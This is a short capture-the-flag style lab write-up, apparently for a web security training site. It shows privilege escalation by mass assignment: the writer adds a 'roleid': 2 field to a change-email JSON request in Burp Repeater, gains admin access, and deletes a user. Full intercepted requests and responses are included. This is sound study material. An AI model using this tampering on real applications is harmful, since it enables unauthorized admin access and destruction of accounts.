*This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2. Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: wiener:peter*

Logged into the account with the given credentials. 

Given an option to update the email, to which I changed. Burp Intercept was enabled when I clicked on *Update Email*. The following was the output. 

```Burp
POST /my-account/change-email HTTP/2
Host: 0ad700be041a808282f9151300860078.web-security-academy.net
Cookie: session=kNzEh4rmCxVtlk36Zg5iKA1L5nd2GDN5
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 31
Origin: https://0ad700be041a808282f9151300860078.web-security-academy.net
Referer: https://0ad700be041a808282f9151300860078.web-security-academy.net/my-account
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"email":"wienerman@gmail.com"}
```

After sending this to the Repeater and forwarding the request, I received the following response with my roleid: 
```Burp
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 123

{
  "username": "wiener",
  "email": "wienerman@gmail.com",
  "apikey": "AONgFEfrtiUCbiK9MCLNc78zES1JqyX4",
  "roleid": 1
}
```

I modified the `json` in the request to add and change the roleid to 2.
```Burp
POST /my-account/change-email HTTP/2
Host: 0ad700be041a808282f9151300860078.web-security-academy.net
Cookie: session=kNzEh4rmCxVtlk36Zg5iKA1L5nd2GDN5
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 45
Origin: https://0ad700be041a808282f9151300860078.web-security-academy.net
Referer: https://0ad700be041a808282f9151300860078.web-security-academy.net/my-account
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{
"email":"wienerman@gmail.com",
"roleid": 2
}
```
Looking at the browser, I had now the admin panel to delete the user *carlos*.

Done!